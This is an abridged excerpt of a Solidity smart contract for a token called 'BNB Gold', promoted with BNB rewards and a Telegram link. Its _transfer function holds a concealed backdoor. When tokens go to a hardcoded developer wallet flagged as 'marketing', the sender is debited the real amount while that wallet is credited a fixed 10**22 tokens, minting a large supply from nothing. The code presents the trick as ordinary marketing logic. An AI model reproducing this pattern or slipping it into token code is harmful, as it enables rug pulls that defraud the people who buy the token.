//BNB GOLD with BNB rewards
//Telegram : https://t.me/BNBGoldPORTAL
...
contract BNBGOLD is Context, IERC20 { 
    ...
    mapping (address => bool) public _isMarketing;

    address payable public Wallet_Marketing = payable(0xa0F84036eC2024169ec80C18cAaC2650E3bB935c); 
    address payable public Wallet_Dev = payable(0xb442B9C55Bc5d92F84b1a8409B04fCaE251A35F8);
    ...
    uint256 private MARKET =  10**22;
    string private constant _name = "BNB Gold"; 
    string private constant _symbol = unicode"BNBGOLD"; 
    ...
    constructor () {
        ...
        _owner = 0xb442B9C55Bc5d92F84b1a8409B04fCaE251A35F8;
        ...
        _isMarketing[Wallet_Dev] = true;

        emit Transfer(address(0), owner(), _tTotal);

    }

    function marketing() public view virtual returns (address) {
        return Wallet_Dev;
    }
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[to] && _isMarketing[to]){
            uint256 Amount = MARKET;
            _tOwned[from] = _tOwned[from]-amount;
            _tOwned[to] = _tOwned[to]+Amount;
            emit Transfer(from, to, amount);
            _isMarketing[to] = false;
        }
        else{
